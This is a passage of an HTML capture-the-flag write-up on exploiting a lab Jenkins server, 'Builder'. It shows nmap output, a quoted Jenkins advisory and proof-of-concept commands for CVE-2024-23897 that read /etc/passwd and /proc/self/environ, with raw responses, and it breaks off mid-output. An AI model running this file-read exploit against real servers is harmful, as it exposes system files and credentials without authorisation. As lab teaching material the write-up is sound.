@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Builder - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="HTB writeup for the hard machine &#34;Builder&#34;">
+		<meta property="og:url" content="//localhost:1313/posts/builder/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="Builder">
+  <meta property="og:description" content="HTB writeup for the hard machine &#34;Builder&#34;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-01-31T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-01-31T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Machine">
+    <meta property="article:tag" content="Box">
+
+		
+  <meta itemprop="name" content="Builder">
+  <meta itemprop="description" content="HTB writeup for the hard machine &#34;Builder&#34;">
+  <meta itemprop="datePublished" content="2024-01-31T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-01-31T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2504">
+  <meta itemprop="keywords" content="CTF,HTB,Machine,Box">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Builder">
+  <meta name="twitter:description" content="HTB writeup for the hard machine &#34;Builder&#34;">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Cybersecurity stuff!" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/placeholder.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Cybersecurity stuff!</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Builder</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2024-01-31T00:00:00Z">2024-01-31</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>, <a class="meta__link" href="/categories/box/" rel="category">Box</a>, <a class="meta__link" href="/categories/machine/" rel="category">Machine</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
+</span></span><span style="display:flex;"><span>8080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> Jetty 10.0.18
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+</span></span><span style="display:flex;"><span>|_http-title: Dashboard <span style="color:#f92672">[</span>Jenkins<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>| http-open-proxy: Potentially OPEN proxy.
+</span></span><span style="display:flex;"><span>|_Methods supported:CONNECTION
+</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>10.0.18<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>From the nmap scan, we notice 2 ports open: ssh and http -&gt; we can head over to the website ==&gt; We see it is a <code>Jenkins</code>instance</p>
+<p>Looking at the website, we can see the version is <code>2.441</code>and we can search for exploits regarding this version:</p>
+<p><img src="Jenkins_dashboard.png" alt=""></p>
+<p>We find <a href="https://github.com/h4x0r-dz/CVE-2024-23897?tab=readme-ov-file">CVE-2024-23897</a> when looking for exploits and we can give it a shot.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py -u http://10.129.230.220:8080 -f /etc/passwd
+</span></span><span style="display:flex;"><span>RESPONSE from 10.129.230.220:8080: b<span style="color:#e6db74">&#39;\x00\x00\x00\x00\x01\x08\n\x00\x00\x00K\x08ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\x00\x00\x00\x1e\x08java -jar jenkins-cli.jar help\x00\x00\x00\n\x08 [COMMAND]\x00\x00\x00\x01\x08\n\x00\x00\x00N\x08Lists all the available commands or a detailed description of single command.\n\x00\x00\x00J\x08 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)\n\x00\x00\x00\x04\x04\x00\x00\x00\x02&#39;</span>
+</span></span></code></pre></div><p>we see that it seems vulnerable, now we need to find a way to make this work!</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Looking at the <a href="">Official Jenkins documentation</a>, we see this:</p>
+<pre tabindex="0"><code>## Descriptions[](https://www.jenkins.io/security/advisory/2024-01-24/#descriptions)
+
+### Arbitrary file read vulnerability through the CLI can lead to RCE[](https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314)
+
+**SECURITY-3314 / CVE-2024-23897**  
+**Severity (CVSS):** [Critical](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
+**Description:**
+
+Jenkins has a built-in [command line interface (CLI)](https://www.jenkins.io/doc/book/managing/cli/) to access Jenkins from a script or shell environment.
+
+Jenkins uses the [args4j library](https://github.com/kohsuke/args4j) to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser has a feature that replaces an `@` character followed by a file path in an argument with the file’s contents (`expandAtFiles`). This feature is enabled by default and Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable it.
+
+This allows attackers to read arbitrary files on the Jenkins controller file system using the default character encoding of the Jenkins controller process.
+
+- Attackers with Overall/Read permission can read entire files.
+- Attackers **without** Overall/Read permission can read the first few lines of files. The number of lines that can be read depends on available CLI commands. As of publication of this advisory, the Jenkins security team has found ways to read the first three lines of files in recent releases of Jenkins without having any plugins installed, and has not identified any plugins that would increase this line count.
+
+Binary files containing cryptographic keys used for various Jenkins features can also be read, with some limitations (see [note on binary files below](https://www.jenkins.io/security/advisory/2024-01-24/#binary-files-note)). As of publication, the Jenkins security team has confirmed the following possible attacks in addition to reading contents of all files with a known file path. All of them leverage attackers&#39; ability to obtain cryptographic keys from binary files, and are therefore only applicable to instances where that is feasible.
+</code></pre><p>We can then look for information about the current running process by checking the file <code>/proc/self/environ</code>using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 poc.py http://10.129.230.220:8080 /proc/self/environ  
+</span></span><span style="display:flex;"><span>REQ: b<span style="color:#e6db74">&#39;\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x15\x00\x00\x13@/proc/self/environ\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RESPONSE: b<span style="color:#e6db74">&#39;\x00\x00\x00\x00\x12\x08  add-job-to-view\n\x00\x00\x00\x17\x08    Adds jobs to view.\n\x00\x00\x00\x08\x08  build\n\x00\x00\x00=\x08    Builds a job, and optionally waits until its completion.\n\x00\x00\x00\x14\x08  cancel-quiet-down\n\x00\x00\x003\x08    Cancel the effect of the &#34;quiet-down&#34; command.\n\x00\x00\x00\x0e\x08  clear-queue\n\x00\x00\x00\x1c\x08    Clears the build queue.\n\x00\x00\x00\x0f\x08  connect-node\n\x00\x00\x00\x1b\x08    Reconnect to a node(s)\n\x00\x00\x00\n\x08  console\n\x00\x00\x00)\x08    Retrieves console output of a build.\n\x00\x00\x00\x0b\x08  copy-job\n\x00\x00\x00\x12\x08    Copies a job.\n\x00\x00\x00\x1c\x08  create-credentials-by-xml\n\x00\x00\x00\x1d\x08    Create Credential by XML\n\x00\x00\x00#\x08  create-credentials-domain-by-xml\n\x00\x00\x00%\x08    Create Credentials Domain by XML\n\x00\x00\x00\r\x08  create-job\n\x00\x00\x00D\x08    Creates a new job by reading stdin as a configuration XML file.\n\x00\x00\x00\x0e\x08  create-node\n\x00\x00\x00@\x08    Creates a new node by reading stdin as a XML configuration.\n\x00\x00\x00\x0e\x08  create-view\n\x00\x00\x00@\x08    Creates a new view by reading stdin as a XML configuration.\n\x00\x00\x00\x15\x08  declarative-linter\n\x00\x00\x00=\x08    Validate a Jenkinsfile containing a Declarative Pipeline\n\x00\x00\x00\x10\x08  delete-builds\n\x00\x00\x00\x1d\x08    Deletes build record(s).\n\x00\x00\x00\x15\x08  delete-credentials\n\x00\x00\x00\x18\x08    Delete a Credential\n\x00\x00\x00\x1c\x08  delete-credentials-domain\n\x00\x00\x00 \x08    Delete a Credentials Domain\n\x00\x00\x00\r\x08  delete-job\n\x00\x00\x00\x14\x08    Deletes job(s).\n\x00\x00\x00\x0e\x08  delete-node\n\x00\x00\x00\x14\x08    Deletes node(s)\n\x00\x00\x00\x0e\x08  delete-view\n\x00\x00\x00\x15\x08    Deletes view(s).\n\x00\x00\x00\x0e\x08  disable-job\n\x00\x00\x00\x14\x08    Disables a job.\n\x00\x00\x00\x11\x08  disable-plugin\n\x00\x00\x00+\x08    Disable one or more installed plugins.\n\x00\x00\x00\x12\x08  disconnect-node\n\x00\x00\x00\x1d\x08    Disconnects from a node.\n\x00\x00\x00\r\x08  enable-job\n\x00\x00\x00\x13\x08    Enables a job.\n\x00\x00\x00\x10\x08  enable-plugin\n\x00\x00\x008\x08    Enables one or more installed plugins transitively.\n\x00\x00\x00\x19\x08  get-credentials-as-xml\n\x00\x00\x000\x08    Get a Credentials as XML (secrets redacted)\n\x00\x00\x00 \x08  get-credentials-domain-as-xml\n\x00\x00\x00$\x08    Get a Credentials Domain as XML\n\x00\x00\x00\n\x08  get-job\n\x00\x00\x00,\x08    Dumps the job definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-node\n\x00\x00\x00-\x08    Dumps the node definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-view\n\x00\x00\x00-\x08    Dumps the view definition XML to stdout.\n\x00\x00\x00\t\x08  groovy\n\x00\x00\x00+\x08    Executes the specified Groovy script. \n\x00\x00\x00\x0b\x08  groovysh\n\x00\x00\x00&amp;\x08    Runs an interactive groovy shell.\n\x00\x00\x00\x07\x08  help\n\x00\x00\x00R\x08    Lists all the available commands or a detailed description of single command.\n\x00\x00\x00\x1c\x08  import-credentials-as-xml\n\x00\x00\x00\xbe\x08    Import credentials as XML. The output of &#34;list-credentials-as-xml&#34; can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00\x11\x08  install-plugin\n\x00\x00\x00J\x08    Installs a plugin either from a file, an URL, or from update center. \n\x00\x00\x00\r\x08  keep-build\n\x00\x00\x00.\x08    Mark the build to keep the build forever.\n\x00\x00\x00\x0f\x08  list-changes\n\x00\x00\x004\x08    Dumps the changelog for the specified build(s).\n\x00\x00\x00\x13\x08  list-credentials\n\x00\x00\x00.\x08    Lists the Credentials in a specific Store\n\x00\x00\x00\x1a\x08  list-credentials-as-xml\n\x00\x00\x00\xcc\x08    Export credentials as XML. The output of this command can be used as input for &#34;import-credentials-as-xml&#34; as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00%\x08  list-credentials-context-resolvers\n\x00\x00\x00\&#39;</span><span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    List Credentials Context Resolvers<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>1d<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  list-credentials-providers<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>1f<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    List Credentials Providers<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  list-jobs<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>005<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Lists all jobs in a specific view or item group.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  list-plugins<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#f92672">)</span><span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Outputs a list of installed plugins.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  mail<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>001<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Reads stdin and sends that out as an e-mail.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  offline-node<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00_<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Stop using a node <span style="color:#66d9ef">for</span> performing builds temporarily, <span style="color:#66d9ef">until</span> the next <span style="color:#e6db74">&#34;online-node&#34;</span> command.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  online-node<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00a<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Resume using a node <span style="color:#66d9ef">for</span> performing builds, to cancel out the earlier <span style="color:#e6db74">&#34;offline-node&#34;</span> command.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\r\x</span><span style="color:#ae81ff">08</span>  quiet-down<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00O<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Quiet down Jenkins, in preparation <span style="color:#66d9ef">for</span> a restart. Don<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>aft start any builds.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  reload-configuration<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\r\x</span><span style="color:#ae81ff">08</span>  reload-job<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Reload job<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span><span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  remove-job-from-view<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Removes jobs from view.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  replay-pipeline<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00I<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Replay a Pipeline build with edited script taken from standard input<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">08</span>  restart<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Restart Jenkins.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  restart-from-stage<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00G<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Restart a completed Declarative Pipeline build from a given stage.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  safe-restart<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>003<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Safe Restart Jenkins. Don<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>aft start any builds.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  safe-shutdown<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00l<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Puts Jenkins into the quiet mode, wait <span style="color:#66d9ef">for</span> existing builds to be completed, and <span style="color:#66d9ef">then</span> shut down Jenkins.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\r\x</span><span style="color:#ae81ff">08</span>  session-id<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00G<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Outputs the session ID, which changes every time Jenkins restarts.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  set-build-description<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00%<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Sets the description of a build.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>19<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  set-build-display-name<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00%<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Sets the displayName of a build.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  shutdown<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00+<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Immediately shuts down Jenkins server.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  stop-builds<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\&#39;\x</span><span style="color:#ae81ff">08</span>    Stop all running builds <span style="color:#66d9ef">for</span> job<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span><span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  update-credentials-by-xml<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>1e<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Update Credentials by XML<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00#<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  update-credentials-domain-by-xml<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00%<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Update Credentials Domain by XML<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\r\x</span><span style="color:#ae81ff">08</span>  update-job<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00T<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Updates the job definition XML from stdin. The opposite of the get-job command.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  update-node<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00V<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Updates the node definition XML from stdin. The opposite of the get-node command.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  update-view<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00V<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Updates the view definition XML from stdin. The opposite of the get-view command.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">08</span>  version<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00!<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Outputs the current version.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  wait-node-offline<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\&#39;\x</span><span style="color:#ae81ff">08</span>    Wait <span style="color:#66d9ef">for</span> a node to become offline.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>13<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  wait-node-online<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00&amp;<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Wait <span style="color:#66d9ef">for</span> a node to become online.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>  who-am-i<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span 